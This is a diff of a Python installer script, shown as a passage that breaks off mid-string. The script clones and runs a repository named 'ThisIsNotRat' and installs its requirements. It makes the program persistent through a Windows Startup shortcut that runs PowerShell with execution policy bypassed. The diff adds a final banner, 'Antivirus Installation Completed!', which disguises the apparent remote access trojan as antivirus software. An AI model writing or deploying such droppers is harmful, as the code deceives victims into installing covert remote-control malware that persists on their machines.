@@ -5,39 +5,32 @@ from pathlib import Path
 # ------------------ CONFIG ------------------
 REPO_URL = "https://github.com/Safir-Akhtar/ThisIsNotRat.git"
 CLONE_DIR = Path.home() / "ThisIsNotRat"
-MAIN_SCRIPT = "main.py"  # Change if your main file has a different name
+MAIN_SCRIPT = "main.py"  # Change if your main file is different
 PS_SCRIPT_PATH = Path.home() / "RunThisIsNotRat.ps1"
 # -------------------------------------------
 
-def run_command(cmd):
-    try:
-        subprocess.run(cmd, shell=True, check=True)
-    except subprocess.CalledProcessError:
-        print(f"[!] Command failed: {cmd}")
+def run_cmd(cmd):
+    """Run a command in PowerShell."""
+    subprocess.run(["powershell", "-Command", cmd], shell=True)
 
-# 1. Clone repo if it doesn't exist
-if not CLONE_DIR.exists():
-    print("[*] Cloning repository...")
-    run_command(f"git clone {REPO_URL} \"{CLONE_DIR}\"")
-else:
-    print("[*] Repo already exists. Pulling latest...")
-    run_command(f"git -C \"{CLONE_DIR}\" pull")
+# 1. Commands to run sequentially in PowerShell
+commands = [
+    f"Write-Host 'Cloning repo...' ; git clone {REPO_URL} '{CLONE_DIR}'" if not CLONE_DIR.exists() else f"Write-Host 'Repo exists. Pulling...' ; git -C '{CLONE_DIR}' pull",
+    f"Write-Host 'Installing requirements...' ; pip install -r '{CLONE_DIR / 'requirements.txt'}'",
+    f"Write-Host 'Running main script...' ; python '{CLONE_DIR / MAIN_SCRIPT}'"
+]
 
-# 2. Install requirements globally
-req_file = CLONE_DIR / "requirements.txt"
-if req_file.exists():
-    print("[*] Installing requirements...")
-    run_command(f"pip install -r \"{req_file}\"")
+for cmd in commands:
+    run_cmd(cmd)
 
-# 3. Create PowerShell startup script
-print("[*] Creating PowerShell script...")
+# 2. Create PowerShell startup script
 ps_content = f"""
 cd "{CLONE_DIR}"
 python {MAIN_SCRIPT}
 """
 PS_SCRIPT_PATH.write_text(ps_content)
 
-# 4. Add shortcut to startup folder
+# 3. Add shortcut to startup folder
 startup = Path(os.getenv("APPDATA")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 shortcut_path = startup / "RunThisIsNotRat.lnk"
 
@@ -50,12 +43,15 @@ try:
     shortcut.Targetpath = "powershell.exe"
     shortcut.Arguments = f'-ExecutionPolicy Bypass -File "{PS_SCRIPT_PATH}"'
     shortcut.WorkingDirectory = str(CLONE_DIR)
-    shortcut.IconLocation = "shell32.dll, 1"
     shortcut.save()
-    print("[*] Added to Windows startup.")
 except ImportError:
-    print("[!] pywin32 is required to create startup shortcut. Install with 'pip install pywin32'")
+    print("[!] pywin32 required to create startup shortcut. Install: pip install pywin32")
 
-# 5. Run the main script immediately
-print("[*] Launching main script...")
-run_command(f'python "{CLONE_DIR / MAIN_SCRIPT}"')
+# 4. Final success message in large green text and exit
+final_message = """
+$Host.UI.RawUI.ForegroundColor = 'Green'
+Write-Host '
+##########################################################
+#                                                        #
+#        Antivirus Installation Completed!              #
+#                      
